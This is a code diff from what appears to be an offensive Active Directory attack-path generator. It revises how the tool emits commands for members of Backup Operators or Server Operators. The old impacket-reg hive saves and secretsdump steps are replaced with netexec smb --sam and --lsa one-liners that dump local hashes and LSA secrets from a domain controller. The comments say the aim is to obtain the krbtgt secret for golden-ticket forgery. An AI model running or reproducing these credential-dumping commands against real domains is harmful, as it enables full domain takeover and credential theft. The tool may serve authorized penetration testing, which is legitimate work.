@@ -970,29 +970,27 @@ def run(report, store, ui=None):
             # iter-115: Backup/Server Operators do NOT hold DRSUAPI GetChanges
             # rights, so the standard secretsdump DCSync form fails. What they
             # DO have is SeBackupPrivilege honored through remote-registry, so
-            # they can save HKLM\SAM+SECURITY+SYSTEM hives off the DC and
-            # secretsdump those OFFLINE (LOCAL mode) - which recovers krbtgt
-            # via the SECURITY hive's LSA secrets. Route BOp/SOp members
-            # through the registry-save pattern instead of DCSync.
+            # they can snapshot HKLM\SAM+SECURITY+SYSTEM off the DC and pull
+            # krbtgt from the SECURITY hive's LSA secrets. iter-116: use
+            # netexec's --sam / --lsa which drive the same primitive as a
+            # one-liner (impacket-reg save writes to the REMOTE machine, so
+            # the /tmp/... paths I emitted first were wrong-domain).
             _via_low = via.lower() if via else ""
             _is_bop_sop = _via_low in ("backup operators", "server operators")
             if _is_bop_sop:
+                _nxc_auth = (f"-u '{ulc}' -H {pw[1:]}" if _is_hash_ac
+                             else f"-u '{ulc}' -p '{pw}'")
                 chains.append(Chain("R-ADMIN-CRED", "backup/server op -> hive dump",
                     f"{_summary_val} - {via.title()} member (no DCSync, use hive save)",
                     crit=10, conf=0.95, ready=1.4, prox=1.0,     # score 13.3
                     commands=[
                         f"# {via.title()} hold SeBackupPrivilege remotely; "
-                        f"they cannot DCSync but can save SAM/SECURITY/SYSTEM",
-                        f"impacket-reg{_hash_flag} {_auth_target} save "
-                        f"-keyName 'HKLM\\SAM'      -o /tmp/SAM.save",
-                        f"impacket-reg{_hash_flag} {_auth_target} save "
-                        f"-keyName 'HKLM\\SECURITY' -o /tmp/SECURITY.save",
-                        f"impacket-reg{_hash_flag} {_auth_target} save "
-                        f"-keyName 'HKLM\\SYSTEM'   -o /tmp/SYSTEM.save",
-                        f"impacket-secretsdump -sam /tmp/SAM.save "
-                        f"-security /tmp/SECURITY.save "
-                        f"-system /tmp/SYSTEM.save LOCAL   "
-                        f"# extracts krbtgt from LSA secrets -> R-GOLDEN",
+                        f"they cannot DCSync. netexec drives the same "
+                        f"registry-hive-save primitive as a one-liner:",
+                        f"netexec smb {_dc_ac} {_nxc_auth} --sam   "
+                        f"# local machine account NT hashes",
+                        f"netexec smb {_dc_ac} {_nxc_auth} --lsa   "
+                        f"# LSA secrets incl. cached domain krbtgt -> R-GOLDEN",
                     ], src=best_src, line=best_line))
             else:
                 chains.append(Chain("R-ADMIN-CRED", "already-DA cred",
